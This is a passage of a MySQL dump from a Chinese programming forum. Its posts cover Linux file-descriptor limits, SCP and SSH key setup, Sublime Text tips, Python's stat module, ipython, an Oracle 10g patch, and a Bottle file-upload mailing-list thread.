	(4, 'vim专区', NULL, 'vim', 0),
	(5, 'emacs专区', NULL, 'emacs', 0),
	(6, 'sublime text 2专区', NULL, 'st2', 0),
	(8, 'php编程', NULL, 'php', 0),
	(9, 'web前端设计', NULL, 'web', 0);
/*!40000 ALTER TABLE `groups` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.langs
DROP TABLE IF EXISTS `langs`;
CREATE TABLE IF NOT EXISTS `langs` (
  `id` int(4) NOT NULL,
  `name` varchar(32) NOT NULL DEFAULT '',
  `ext` varchar(16) DEFAULT NULL,
  `hits` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.langs: ~18 rows (approximately)
DELETE FROM `langs`;
/*!40000 ALTER TABLE `langs` DISABLE KEYS */;
INSERT INTO `langs` (`id`, `name`, `ext`, `hits`) VALUES
	(1, 'c', 'c', 0),
	(2, 'pascal', 'pas', 0),
	(3, 'java', 'java', 0),
	(4, 'lua', 'lua', 0),
	(5, 'c#', 'cs', 0),
	(6, 'javascript', 'js', 0),
	(7, 'vb', 'vb', 0),
	(8, 'c++', 'cpp', 0),
	(9, 'perl', 'pl', 0),
	(10, 'golang', 'go', 0),
	(11, 'python', 'py', 0),
	(12, 'objective-c', 'c', 0),
	(13, 'shell', 'sh', 0),
	(14, 'matlab', 'm', 0),
	(15, 'sql', 'sql', 0),
	(16, 'lisp', 'lsp', 0),
	(17, 'php', 'php', 0),
	(18, 'ruby', 'rb', 0);
/*!40000 ALTER TABLE `langs` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.postmeta
DROP TABLE IF EXISTS `postmeta`;
CREATE TABLE IF NOT EXISTS `postmeta` (
  `id` varchar(32) NOT NULL,
  `postid` varchar(32) NOT NULL,
  `key` varchar(255) NOT NULL,
  `value` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.postmeta: ~0 rows (approximately)
DELETE FROM `postmeta`;
/*!40000 ALTER TABLE `postmeta` DISABLE KEYS */;
/*!40000 ALTER TABLE `postmeta` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.posts
DROP TABLE IF EXISTS `posts`;
CREATE TABLE IF NOT EXISTS `posts` (
  `id` varchar(32) NOT NULL,
  `userid` varchar(32) NOT NULL,
  `groupid` varchar(32) DEFAULT NULL,
  `codeid` varchar(32) DEFAULT NULL,
  `title` varchar(255) NOT NULL,
  `tags` varchar(255) NOT NULL,
  `description` varchar(1024) DEFAULT NULL,
  `content` text NOT NULL,
  `status` int(1) NOT NULL DEFAULT '1',
  `hits` int(10) NOT NULL DEFAULT '0',
  `recs` int(10) NOT NULL DEFAULT '0',
  `created` varchar(32) NOT NULL,
  `modified` varchar(32) NOT NULL,
  `via` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `created` (`created`),
  KEY `modified` (`modified`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.posts: ~31 rows (approximately)
DELETE FROM `posts`;
/*!40000 ALTER TABLE `posts` DISABLE KEYS */;
INSERT INTO `posts` (`id`, `userid`, `groupid`, `codeid`, `title`, `tags`, `description`, `content`, `status`, `hits`, `recs`, `created`, `modified`, `via`) VALUES
	('300ad2886e924c35bbb69b1e091a00ef', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, '修改Linux系统下的最大文件描述符限制', 'linux', NULL, '\n\nlinux下最大文件描述符的限制有两个方面，一个是用户级的限制，另外一个则是系统级限制。\n先介绍如何修改系统级的限制通常我们通过终端连接到linux系统后执行ulimit -n 命令可以看到本次登录的session其文件描述符的限制，如下：\n\n>$ulimit -n\n1024\n\n当然可以通过ulimit -SHn 102400 \n\n命令来修改该限制，但这个变更只对当前的session有效，当断开连接重新连接后更改就失效了。\n如果想永久变更需要修改/etc/security/limits.conf 文件，如下：\n\n>vi /etc/security/limits.conf\n* hard nofile 102400\n* soft nofile 102400\n\n保存退出后重新登录，其最大文件描述符已经被永久更改了。\n这只是修改用户级的最大文件描述符限制，也就是说每一个用户登录后执行的程序占用文件描述符的总数不能超过这个限制。系统级的限制它是限制所有用户打开文件描述符的总和，可以通过修改内核参数来更改该限制：\n\n>sysctl -w fs.file-max=102400\n\n使用sysctl命令更改也是临时的，如果想永久更改需要在/etc/sysctl.conf添加\n\n>fs.file-max=102400\n\n保存退出后使用sysctl -p 命令使其生效。\n\n与file-max参数相对应的还有file-nr，这个参数是只读的，可以查看当前文件描述符的使用情况。\n下面是摘自kernel document中关于file-max和file-nr参数的说明\n\n>file-max & file-nr:The kernel allocates file handles dynamically, but as yet it doesn’t free them again.\n\n内核可以动态的分配文件句柄，但到目前为止是不会释放它们的\n\n>The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate. When you get lots of error messages about running out of file handles, you might want to increase this limit.\n\nfile-max的值是linux内核可以分配的最大文件句柄数。如果你看到了很多关于打开文件数已经达到了最大值的错误信息，你可以试着增加该值的限制\n\n>Historically, the three values in file-nr denoted the number of allocated file handles, the number of allocated but unused file handles, and the maximum number of file handles. Linux 2.6 always reports 0 as the number of free file handles — this is not an error, it just means that the number of allocated file handles exactly matches the number of used file handles.\n\n在kernel 2.6之前的版本中，file-nr 中的值由三部分组成，分别为：\n\n1. 已经分配的文件句柄数，\n2. 已经分配单没有使用的文件句柄数，\n3. 最大文件句柄数。但在kernel 2.6版本中第二项的值总为0，这并不是一个错误，它实际上意味着已经分配的文件句柄无一浪费的都已经被使用了file-max的默认值大概是系统内存的10%（系统内存以kb计算），\n', 1, 28, 9, '2012-07-13 23:16:27', '2012-07-13 23:16:27', 'sublime text 2'),
	('328dcb9dabde4b49800915f34c660a5d', 'd07d60af92a14169afc444f5d5aeb45a', '', NULL, '有没有人用github的客户端，问题挺多的', 'git,github', NULL, '\n这玩意使用.net开发的，在一台win7上导致蓝屏好几次了，这还不算什么，有几次我正在编辑代码时，发现代码莫名其妙的回滚到以前的版本，啥玩意，还是bash靠谱些', 1, 30, 7, '2012-07-12 13:59:28', '2012-07-12 13:59:28', 'sublime text 2'),
	('3aa5d58c32f641668bd76ae037edec77', '4e84ce1b8a5247bb8a6179959438b55f', '', '', '一些必不可少的Sublime Text 2插件', 'sublime text 2', NULL, '中文原文：[一些必不可少的sublime text 2插件](http://www.qianduan.net/essential-to-sublime-the-text-2-plugins.html)\r\n英文来源：[Essential Sublime Text 2 Plugins and Extensions](http://net.tutsplus.com/tutorials/tools-and-tips/essential-sublime-text-2-plugins-and-extensions/)\r\n', 1, 36, 6, '2012-07-13 17:51:27', '2012-07-13 17:51:27', NULL),
	('3ed5aba231944b33926768774875160a', '4e84ce1b8a5247bb8a6179959438b55f', '3', NULL, 'python stat模块', 'python', NULL, '\n    #!/usr/bin/env python\n    #-*- encoding:UTF-8 -*-\n    import os,time,stat\n    fileStats = os.stat ( \'test.txt\' )                         #获取文件/目录的状态\n    fileInfo = {\n    \'Size\':fileStats [ stat.ST_SIZE ],                         #获取文件大小\n    \'LastModified\':time.ctime( fileStats [ stat.ST_MTIME ] ),  #获取文件最后修改时间\n    \'LastAccessed\':time.ctime( fileStats [ stat.ST_ATIME ] ),  #获取文件最后访问时间\n    \'CreationTime\':time.ctime( fileStats [ stat.ST_CTIME ] ),  #获取文件创建时间\n    \'Mode\':fileStats [ stat.ST_MODE ]                          #获取文件的模式\n    }\n    #print fileInfo\n    for field in fileInfo:                                     #显示对象内容\n      print \'%s:%s\' % (field,fileInfo[field])\n    for infoField,infoValue in fileInfo:\n      print \'%s:%s\' % (infoField,infoValue)\n    if stat.S_ISDIR ( fileStats [ stat.ST_MODE ] ):           #判断是否路径\n      print \'Directory. \'\n    else:\n      print \'Non-directory.\'\n    if stat.S_ISREG( fileStats [ stat.ST_MODE ] ):           #判断是否一般文件\n       print \'Regular file.\'\n    elif stat.S_ISLNK ( fileStats [ stat.ST_MODE ] ):         #判断是否链接文件\n       print \'Shortcut.\'\n    elif stat.S_ISSOCK ( fileStats [ stat.ST_MODE ] ):        #判断是否套接字文件     \n       print \'Socket.\'\n    elif stat.S_ISFIFO ( fileStats [ stat.ST_MODE ] ):        #判断是否命名管道\n       print \'Named pipe.\'\n    elif stat.S_ISBLK ( fileStats [ stat.ST_MODE ] ):         #判断是否块设备\n       print \'Block special device.\'\n    elif stat.S_ISCHR ( fileStats [ stat.ST_MODE ] ):         #判断是否字符设置\n       print \'Character special device.\'\n       stat模块描述了os.stat(filename)返回的文件属性列表中各值的意义.我们可方便地根据stat模块存取os.stat()中的值.\n    os.stat(path)执行一个stat()系统调用在给定的path上，返回一个类元组对象(stat_result对象,包含10个元素),属性与stat结构成员相关:st_mode(权限模式),st_ino(inode number),st_dev(device),st_nlink(number of hard links),st_uid(所有用户的user id),st_gid(所有用户的group id),st_size(文件大小，以位为单位)，st_atime(最近访问的时间),st_mtime(最近修改的时间),st_ctime(创建的时间)\n    >>> import os\n    >>> print os.stat("/root/python/zip.py")\n    (33188, 2033080, 26626L, 1, 0, 0, 864, 1297653596, 1275528102, 1292892895)\n    >>> print os.stat("/root/python/zip.py").st_mode   #权限模式\n    33188\n    >>> print os.stat("/root/python/zip.py").st_ino   #inode number\n    2033080\n    >>> print os.stat("/root/python/zip.py").st_dev    #device\n    26626\n    >>> print os.stat("/root/python/zip.py").st_nlink  #number of hard links\n    1\n    >>> print os.stat("/root/python/zip.py").st_uid    #所有用户的user id\n    0\n    >>> print os.stat("/root/python/zip.py").st_gid    #所有用户的group id\n    0\n    >>> print os.stat("/root/python/zip.py").st_size  #文件的大小，以位为单位\n    864\n    >>> print os.stat("/root/python/zip.py").st_atime  #文件最后访问时间\n    1297653596\n    >>> print os.stat("/root/python/zip.py").st_mtime  #文件最后修改时间\n    1275528102\n    >>> print os.stat("/root/python/zip.py").st_ctime  #文件创建时间\n    1292892895   ', 1, 20, 6, '2012-07-12 00:19:12', '2012-07-12 00:19:12', 'sublime text 2'),
	('4aedbec89b174704b8892981d92d6eb0', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'sublime text 2 发布2.0.1', 'sublime text', NULL, '\n\n Release Date: 14 July 2012 \n \n* Keyboard input while dragging a selection will cancel the drag\n* Improved backspace behavior when use_tab_stops and translate_tabs_to_spaces are true\n* Improved shift+drag behavior\n* Improved double click drag select behavior\n* About Window shows the license key details\n* Fixed a Goto Anything issue where pressing backspace could scroll the overlay incorrectly\n* Fixed a crash triggered by double clicking in the Goto Anything overlay\n* Fixed incorrect window position when dragging a tab in some scenarios\n* Added missing toggle_preserve_case command\n* word_wrap setting accepts "true" and "false" as synonyms to true and false\n* OSX: Fixed System Preferences menu not working\n* Linux: Added support for mice with more than 5 buttons\n* Linux: Fixed an occasional graphical glitch when running under Unity\n', 1, 57, 6, '2012-07-14 18:46:36', '2012-07-14 18:46:36', 'sublime text 2'),
	('4f87f2ba100b41af80ebb816fb8d3489', 'd07d60af92a14169afc444f5d5aeb45a', '3', NULL, 'ipython介绍', 'python', NULL, '@content:  ipython 是一个 python 的交互式 shell，比默认的 python shell 好用得多，支持变量自动补全，自动缩近，支持 bash shell 命令，内置了许多很有用的功能和函数。在 ubuntu 下只要 sudo apt-get install ipython 就装好了，通过 ipython 启动。\n\n下面是 ipython 中几个简单好用的 magic 函数:\n* * *\n\n%bg function把 function 放到后台执行，例如: %bg myfunc(x, y, z=1)，之后可以用jobs将其结果取回。myvar = jobs.result(5) 或 myvar = jobs[5].result。另外，jobs.status() 可以查看现有任务的状态。\n%ed 或 %edit编辑一个文件并执行，如果只编辑不执行，用 ed -x filename 即可。\n%env显示环境变量\n%hist 或 %history显示历史记录\n%macro name n1-n2 n3-n4 ... n5 .. n6 ...创建一个名称为 name 的宏，执行 name 就是执行 n1-n2 n3-n4 ... n5 .. n6 ... 这些代码。\n%pwd显示当前目录\n%pycat filename用语法高亮显示一个 python 文件(不用加.py后缀名)\n%save filename n1-n2 n3-n4 ... n5 .. n6 ...将执行过多代码保存为文件\n%time statement计算一段代码的执行时间\n%timeit statement自动选择重复和循环次数计算一段代码的执行时间，太方便了。\n\n另外，ipython 中用 ! 表示执行 shell 命令，用 $ 将 python 的变量转化成 shell 变量。通过这种两个符号，我们就可以做到和 shell 命令之间的交互，可以非常方便地做许多复杂的工作。比如你可以很方便地创建一组目录:\n\n    for i in range(10):\n        s = "dir%s" % i\n        !mkdir $s\n\n不过写法上还是有一些限制，$ 后面只能跟变量名，不能直接写复杂表达式，$"dir%s"%i 就是错误的写法了，所以要先完全产生 python 的变量以后再用。像\n\n    for i in !ls: print i\n\n这样的写法也是错的，可以这样:\n\n    a = !ls\n    for i in a: print i\n\n还有一点需要说明，就是执行普通的 shell 命令中如果有 $ 的话需要用两个 $。比如原来的echo $PATH现在得写成!echo $$PATH。\n\n', 1, 25, 3, '2012-07-11 00:56:00', '2012-07-11 00:56:00', 'sublime text 2'),
	('50c97bf1cf1d4fe3ba1b19e4bf774c08', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'SCP 命令详解', 'scp,linux', NULL, '\n\nSCP 命令跟 CP 命令类似，只不过CP命令是在同一台机器上用的，SCP是在2台机器上复制的命令。\n举例说明：\n\n复制远程服务器的文件到本地\n\n>scp -P 999 root@21andy.com:/home/test.zip /home/\n\n复制本地的目录到远程服务器\n\n>scp -P 999 -r /home/andy/ root@21andy.com:/home/\n\n* SCP 命令语法 *\n\n>scp [-1245BCpqrv] [-c cipher] [F ssh_config] [-I identity_file] [-l limit] [-o ssh_option] [-P port] [-S program] [[user@]host1:] file1 […] [[suer@]host2:]file2\n\n#### SCP 命令说明 \n\nScp在主机间复制文件。他使用 ssh(1)作为数据传输。而且用同样认证和安全性。 scp将在认证中请求输入密码所有的文件可能需要服务器和用户的特别描述来指明文件将被复制到/从某台服务器。两个远程登录的服务器间的文件复制是允许的。\n\n#### SCP 命令选项 \n\n-1 强制scp 用协议1\n\n-2 强制scp 用协议2\n\n-4 强制scp用IPV4的网址\n\n-6 强制scp用IPV6的网址\n\n-B 选择批处理模式（防止输入密码）\n\n-C 允许压缩。 标注-C到ssh(1)来允许压缩\n\n-c cipher\n选择cipher来加密数据传输。这个选项直接传递到ssh(1)\n\n-F ssh_config\n设定一个可变动的用户配置给ssh.这个选项直接会被传递到ssh(1)\n\n-i identity_file\n选择被RSA认证读取私有密码的文件。这个选项可以直接被传递到ssh(1)\n\n-l limit\n限制传输带宽，也就是速度 用Kbit/s的速度\n\n-o ssh_option\n可以把ssh_config中的配置格式传到ssh中。这种模式对于说明没有独立的scp文件中断符的scp很有帮助。关于选项的如下。而他们的值请参看ssh_config(5)\n\n-P port\n指定连接远程连接端口。注意这个选项需要写成大写的模式。因为-p已经早保留了次数和模式\n\n-S program\n指定一个加密程序。这个程序必须可读所有ssh(1)的选项。\n\n-p 指定修改次数，连接次数，还有对于原文件的模式\n\n-q 把进度参数关掉\n\n-r 递归的复制整个文件夹\n\n-S program\n指定一个加密程序。这个程序必须可读所有ssh(1)的选项。\n\n-V 冗余模式。 让 scp 和 ssh(1) 打印他们的排错信息， 这个在排错连接，认证，和配置中非常有用。\n\n#### SCP 命令诊断 \n\nscp 返回0 成功时，不成功时返回值大于0\n\nSCP 命令不需要输入用户密码的使用方法\n\n在两台机器的两个用户之间建立安全的信任关系后，可实现执行scp命令时不需要输入用户密码。\n\n1. 在机器A上root用户执行 ssh-keygen 命令，生成建立安全信任关系的证书。\n[root@A root]# ssh-keygen -b 1024 -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): <– 直接输入回车\nEnter passphrase (empty for no passphrase): <– 直接输入回车\nEnter same passphrase again: <– 直接输入回车\nYour identification has been saved in /root/.ssh/id_rsa.\nYour public key has been saved in /root/.ssh/id_rsa.pub.\nThe key fingerprint is: ……\n注意：在程序提示输入 passphrase 时直接输入回车，表示无证书密码。\n上述命令将生成私钥证书 id_rsa 和公钥证书 id_rsa.pub，存放在用户目录的 .ssh 子目录中。\n\n2. 将公钥证书 id_rsa.pub 复制到机器B的root目录的.ssh子目录中，同时将文件名更换为authorized_keys。\n[root@A root]# scp -p .ssh/id_rsa.pub root@机器B的IP:/root/.ssh/authorized_keys\nroot@192.168.3.206’s password: <– 输入机器B的root用户密码\n在执行上述命令时，两台机器的root用户之间还未建立安全信任关系，所以还需要输入机器B的root用户密码。\n经过以上2步，就在机器A的root和机器B的root之间建立安全信任关系。下面我们看看效果：\n\n[root@A root]# scp -p test root@机器B的IP地址:/root\n\n成功了！真的不再需要输入密码了。\n', 1, 47, 7, '2012-07-13 23:26:09', '2012-07-13 23:26:09', 'sublime text 2'),
	('5897c2628ec64549b356163ca073d9c4', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Sublime Text 2 plugin for Evernote', 'Sublime Text 2,evernote', NULL, '\n\n[Sublime Text 2](http://www.sublimetext.com/2) plugin for [Evernote](http://www.evernote.com) \n\n#### Install\n\nThrough [Package Control](http://wbond.net/sublime_packages/package_control)\n\n`Command Palette` > `Package Control: Install Package` > `SublimeEvernote`\n\nor\n\n`Command Palette` > `Package Control: add Repository` && `input \'http://github.com/jamiesun/SublimeEvernote`\n\n`Command Palette` > `Package Control: Install Package` > `SublimeEvernote`\n\nor clone this repository in\n\n* Windows: `%APPDATA%/Roaming/Sublime Text 2/Packages/`\n* OSX: `~/Library/Application Support/Sublime Text 2/Packages/`\n* Linux: `~/.Sublime Text 2/Packages/`\n* Portable Installation: `Sublime Text 2/Data/`\n\n#### Usage\n\n`Command Palette` > `Send to evernote`\n\n`Context menu` > `Send to evernote`', 1, 57, 6, '2012-07-15 19:07:35', '2012-07-15 19:07:35', 'sublime text 2'),
	('7145146b2a2b4090a709c08442f372ab', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'sublime text 2 常用快捷键', 'sublime text 2', NULL, '\n\nPreferences->Key Bindings – Defaults 即可查看默认的快捷键设置\n\n要定义自己的快捷键，可以在Preferences->Key Bindings – Users 里进行设置\n\n    Ctrl+L  选择整行(按住-继续选择下行)\n    Ctrl+KK 从光标处删除至行尾\n    Ctrl+Shift+K    删除整行\n    Ctrl+Shift+D    复制光标所在整行，插入在该行之前\n    Ctrl+J  合并行(已选择需要合并的多行时)\n    Ctrl+KU 改为大写\n    Ctrl+KL 改为小写\n    Ctrl+D  选词(按住-继续选择下个相同的字符串)\n    Ctrl+M  光标移动至括号内开始或结束的位置\n    Ctrl+Shift+M    选择括号内的内容(按住-继续选择父括号)\n    Ctrl+/  注释整行(如已选择内容，同“Ctrl+Shift+/”效果)\n    Ctrl+Shift+/    注释已选择内容\n    Ctrl+Space  自动完成(win与系统快捷键冲突，需修改)\n    Ctrl+Z  撤销\n    Ctrl+Y  恢复撤销\n    Ctrl+Shift+V    粘贴并自动缩进(其它兄弟写的，实测win系统自动缩进无效)\n    Ctrl+M  光标跳至对应的括号\n    Alt+.   闭合当前标签\n    Ctrl+Shift+A    选择光标位置父标签对儿\n    Ctrl+Shift+[    折叠代码\n    Ctrl+Shift+]    展开代码\n    Ctrl+KT 折叠属性\n    Ctrl+K0 展开所有\n    Ctrl+U  软撤销\n    Ctrl+T  词互换\n    Ctrl+Enter  插入行后\n    Ctrl+Shift Enter    插入行前\n    Ctrl+K Backspace    从光标处删除至行首\n    Ctrl+Shift+UP   与上行互换\n    Ctrl+Shift+DOWN 与下行互换\n    Shift+Tab   去除缩进\n    Tab 缩进\n    F9  行排序(按a-z)', 1, 42, 7, '2012-07-13 17:19:07', '2012-07-13 17:19:07', 'sublime text 2'),
	('7176a65de6e442b1abbcaf6c1808bbec', 'd07d60af92a14169afc444f5d5aeb45a', '', NULL, 'Oracle10g Bug 4612267 补丁安装', 'oracle', NULL, '\n\n#### 一、bug症状和描述\n\n*症状：*\n当主机运行时间达198天或248天，cpu占用率就突然达到100%。此时操作系统命令可以执行，但Oracle的命令象lsnrctl、sqlplus、dbca等都会被hang住，不能执行。\n\nOracle官方对该bug的描述：\n******************************************************\n\n> Interim Patch for Base Bugs: 4612267 \n> DATE: Wed Oct 5 10:17:13 2005\n> Platform Patch for : Linux x86\n> Product Version  : 10.2.0.1\n> Product Patched    : ORACORE\n> Bugs Fixed by this patch:\n> 4612267:OCI CLIENT IS IN AN INFINITE LOOP WHEN MACHINE UPTIME HITS 248 DAYS\n\n\n******************************************************\n\n*备注：*\n事实上只要Linux x86主机运行天数是是24.8的倍数都有可能引发该bug，因为time()函数值为null，造成无限死循环，从而耗尽cpu。\n\n*解决办法三种：*\n1. 重启主机；\n2. 打patch set，如升级到10.2.0.4；\n3. 对该bug单独打临时patch 4612267。\n\n第一种方法没有彻底解决问题，以后照旧；第二种方法，升级时间长，且要求停库很久，当前生产环境暂不适合；本文采用第三种方法。\n\n参考文档：\nDoc ID: 338461.1 SQL*Plus 10.2.0.1 Hangs, When System Uptime Is Long Period of Time\nDoc ID: 4612267.8 Bug 4612267 - OCI client spins when machine uptime >= 249 days\n\n#### 二、先停监听、dbconsole和数据库\n\n> $ lsnrctl stop\n> $ emctl stop dbconsole\n> $ sqlplus / as sysdba\n> SQL> shutdown immediate\n\n注意：dbconsole是在已经装了Oracle EM的情况下要停止，如果未安装则无需干涉。\n\n#### 三、安装patch\n\n\n> $mkdir $ORACLE_BASE/patches\n> $cd $ORACLE_BASE/patches\n> $rz    (SecureCRT里上传 p4612267_10201_LINUX.zip 文件, 其它上传方式也可以)\n> $unzip p4612267_10201_LINUX.zip   \n> $cd 4612267/\n> $$ORACLE_HOME/OPatch/opatch apply\n\nInvoking OPatch 10.2.0.1.0\n...\nPlease shutdown Oracle instances running out of this ORACLE_HOME on the local system.\n(Oracle Home = \'/u01/app/oracle/product/10.2.0/db_1\')\n\nIs the local system ready for patching?\n\nDo you want to proceed? [y|n]\ny    (此处输入y)\nUser Responded with: Y\n...\nApplySession adding interim patch \'4612267\' to inventory\n\nThe local system has been patched and can be restarted.\n\nOPatch succeeded.\n\n#### 四、验证patch\n\n>$ $ORACLE_HOME/OPatch/opatch lsinventory\nInvoking OPatch 10.2.0.1.0\n\n>Oracle interim Patch Installer version 10.2.0.1.0\nCopyright (c) 2005, Oracle Corporation. All rights reserved..\n\n\n>Oracle Home       : /u01/app/oracle/product/10.2.0/db_1\nCentral Inventory : /u01/app/oracle/oraInventory\n   from           : /u01/app/oracle/product/10.2.0/db_1/oraInst.loc\nOPatch version    : 10.2.0.1.0\nOUI version       : 10.2.0.1.0\nOUI location      : /u01/app/oracle/product/10.2.0/db_1/oui\nLog file location : /u01/app/oracle/product/10.2.0/db_1/cfgtoollogs/opatch/opatch-2009_Jan_13_11-06-27-HKT_Tue.log\n\n>Lsinventory Output file location : /u01/app/oracle/product/10.2.0/db_1/cfgtoollogs/opatch/lsinv/lsinventory-2009_Jan_13_11-06-27-HKT_Tue.txt\n\n--------------------------------------------------------------------------------\n>Installed Top-level Products (2): \n\n>Oracle Database 10g                                                  10.2.0.1.0\nOracle Database 10g Products                                         10.2.0.1.0\nThere are 2 products installed in this Oracle Home.\n\n\n>Interim patches (1) :\n\n>Patch 4612267      : applied on Tue Jan 13 11:05:10 HKT 2009\n   Created on 5 Oct 2005, 13:48:00 hrs US/Pacific\n   Bugs fixed:\n     4612267\n\n\n--------------------------------------------------------------------------------\n\nOPatch succeeded.\n\n#### 五、启动数据库、监听和dbconsole\n\n> $ sqlplus / as sysdba\n> SQL> startup\n> $ lsnrctl start\n> $ emctl start dbconsole\n\n#### 六、如果有需要，还可以删除patch，删除前先停库\n\n>$ cd $ORACLE_BASE/patches/4612267\n$ $ORACLE_HOME/OPatch/opatch rollback -id 4612267\nInvoking OPatch 10.2.0.1.0\n...\nPlease shutdown Oracle instances running out of this ORACLE_HOME on the local system.\n(Oracle Home = \'/u01/app/oracle/product/10.2.0/db_1\')\n\n>Is the local system ready for patching?\n\n>Do you want to proceed? [y|n]\ny    (此处输入y)\nUser Responded with: Y\n...\nRollbackSession removing interim patch \'4612267\' from inventory\n\n>The local system has been patched and can be restarted.\n\nOPatch succeeded.\n\n此时再执行上面的验证patch命令就会发现该patch已经删除了。\n\n', 1, 21, 7, '2012-07-13 14:51:40', '2012-07-13 14:51:40', 'sublime text 2'),
	('760f37023d7c42b8a37656adabdaa1ad', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Bottle 文件上传如何确认上传完全了?', 'CPyUG,Bottle', NULL, '\n\n------\n发件人： Zoom.Quiet \n日期： 2012年7月15日 下午6:47\n收件人： "Python.cn@google" <python-cn@googlegroups.com>\n\n\n好吧,俺以前从来没有折腾过 Py 下的文件上传...\n- Bottle 本身是支持的,但是运行示例发现远不是猜想的:\n模板:\n\n    <form action="/upload" method="post" enctype="multipart/form-data">\n      <input type="text" name="name" />\n      <input type="file" name="data" />\n    </form>\n\n应用:\n\n    from bottle import route, request\n    @route(\'/upload\', method=\'POST\')\n    def do_upload():\n        name = request.forms.name\n        data = request.files.data\n        if name and data and data.file:\n            raw = data.file.read() # This is dangerous for big files\n            filename = data.filename\n            return "Hello %s! You uploaded %s (%d bytes)." % (name,\n    filename, len(raw))\n        return "You missed a field."\n\n> 其中:"if name and data and data.file:"\n  永远为徦!\n  俺搜索相关问题,发现,这里,好象接收数据是异步的?!\n  - 在数据没有接收完,或是説浏览器没有上传完成前\n  - 是没有 data.file 的\n  所以,,,,\n\n那么,类比 node.js 应该,有方式对缓存进行检验,以便知道是否完成上传?\n\nthanx for any suggest...\n\nps:\n- 因为将部属到 GAE/SAE 所以,不能使用写入文件的方式,来进行缓存检验\n\n------\n发件人： duyue \n日期： 2012年7月15日 下午7:40\n收件人： python-cn@googlegroups.com\n\nname = request.forms.name\n\n这里应该是 ``name = request.params.name`` 或者 ``name = request.POST.name``\n\n----------\n发件人： 姜晟 \n日期： 2012年7月15日 下午7:49\n收件人： python-cn@googlegroups.com\n\n\n把 data = request.files.data 和下一行的and data\n\n改成 data = request.files.get(\'data\', None) 和 and data is not None\n\n不好说是bottle的bug还是python cgi模块的bug\n\nbottle用的cgi.FieldStorage解析request body, 碰到调用read_multi一块块的继续生成FieldStorage实例， 但是, 这些实例的list是空的\n\n而FieldStorage的__nonzero__方法判断self.list是否为空, 然后就成了request.files.data这个明明非空的变量空了\n\n之前倒是一直没注意， 冷汗直流\n\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月15日 下午8:28\n收件人： python-cn@googlegroups.com\n\n想追查 bottle 源代码的,结果看晕了\n其实,可以等一会儿, data.file 对象就有了\n可惜只能 read() 一次,就自动关闭了,无法 seek(0) 了\n所以,,,折腾中,,,\n\n----------\n发件人： duyue \n日期： 2012年7月16日 上午11:03\n收件人： python-cn@googlegroups.com\n\n可惜只能 read() 一次,就自动关闭了,无法 seek(0) 了\nread出来放到StringIO里\n\n----------\n发件人： lee Alexander \n日期： 2012年7月16日 上午11:51\n收件人： python-cn@googlegroups.com\n\n\n貌似不是异步的，我是这样判断的\n\nfobj=request.files.get("filedata")\n\nfobj.file 就是文件本身了\n\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月16日 上午11:56\n收件人： python-cn@googlegroups.com\n\n\n就是説,这行会阻塞,直到文件整个完全上传完毕?\n\n\n----------\n发件人： lee Alexander \n日期： 2012年7月16日 下午12:02\n收件人： python-cn@googlegroups.com\n\n对，bottle这个是会阻塞的样子\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月17日 下午8:31\n收件人： python-cn@googlegroups.com\n\n\n- 嗯嗯嗯?! 什么意思? 具体怎么作?\n- 另外的操作,需要一个 file 对象,读出来就变成 str对象了,,,纠结...\n- 所谓 file 对象有深度复制嘛?\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月17日 下午9:07\n收件人： python-cn@googlegroups.com\n\nfrom StringIO import StringIO\nfrom shutil import copyfileobj\n\ndata = request.files.get(\'data\', None)\n...\ns = StringIO()\ncopyfileobj(data.file,s)\n\n这样的话, data.file 虽然没有关闭,但是,已经无法从头读取了,,,\n而 s 的类型是 <type \'instance\'> 不是文件对象,,,\n\n----------\n发件人： Wang Xuerui \n日期： 2012年7月17日 下午9:35\n收件人： python-cn@googlegroups.com\n\n虽然从来没有碰到过这种问题。。。。直觉上看，如果完成上传的标志是data.file出现的话，那么设置一个子线程轮询就好了。。。让主线程阻塞在完成锁上。这样至少data.file是原封不动的。。轮询时间长一点，5s~10s的话，服务器应该压力也不大，况且这个poll只是\n\n    try:\n        data.file\n    except AttributeError:\n        pass\n    else:\n        # completed\n        completionLock,release()\n\n这种形式大概。。。不知道多线程在GAE/SAE是否允许，sigh\n\n----------\n发件人： Zoom.Quiet \n日期： 2012年7月17日 下午9:39\n收件人： python-cn@googlegroups.com\n\n\n嚓! 是俺没有检查其它函式,在其它操作有,将 文件对象 close 了,,,所以,,,\nFT!\n\n', 1, 27, 6, '2012-07-17 14:29:26', '2012-07-21 09:11:01', 'sublime text 2'),
